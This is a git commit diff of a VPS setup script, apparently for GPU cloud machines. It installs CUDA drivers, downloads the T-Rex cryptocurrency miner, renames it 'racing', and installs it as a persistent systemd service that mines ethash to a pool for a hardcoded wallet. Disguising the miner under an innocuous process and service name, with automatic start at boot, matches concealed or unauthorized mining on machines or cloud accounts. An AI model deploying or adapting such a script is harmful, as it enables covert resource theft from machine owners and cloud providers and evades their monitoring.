e9456c2d23be3995e1f243b06b201da2694bd887
tonnyhoang2014 <91616570+tonnyhoang2014@users.noreply.github.com>
2022-05-16 21:35:54 +0700

    Update vps1.sh

--- vps1.sh
+++ vps1.sh
@@ -1,7 +1,5 @@
 cd /home
 myworker=$(date +'%d%m_%H%M%S_')
-mytype=NC6
-myworker+=$mytype
 username=$HOSTNAME
 myworker+=$username
 sudo apt-get install linux-headers-$(uname -r) -y
@@ -10,13 +8,21 @@ wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_
 sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
 sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
 echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-key del 7fa2af80
+sudo rm /etc/apt/sources.list.d/cuda.list
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
+sudo dpkg -i cuda-keyring_1.0-1_all.deb
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
-sudo apt-get install libcurl3 -y
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
+sudo apt-get install libcurl4 -y
+sudo apt-get install cuda-drivers-510
+sudo apt-get install cuda-drivers-fabricmanager-510 -y
+sudo systemctl enable nvidia-fabricmanager
+sudo systemctl start nvidia-fabricmanager
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+tar -zxvf t-rex-0.25.12-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re_StureNew\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 ./racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker &
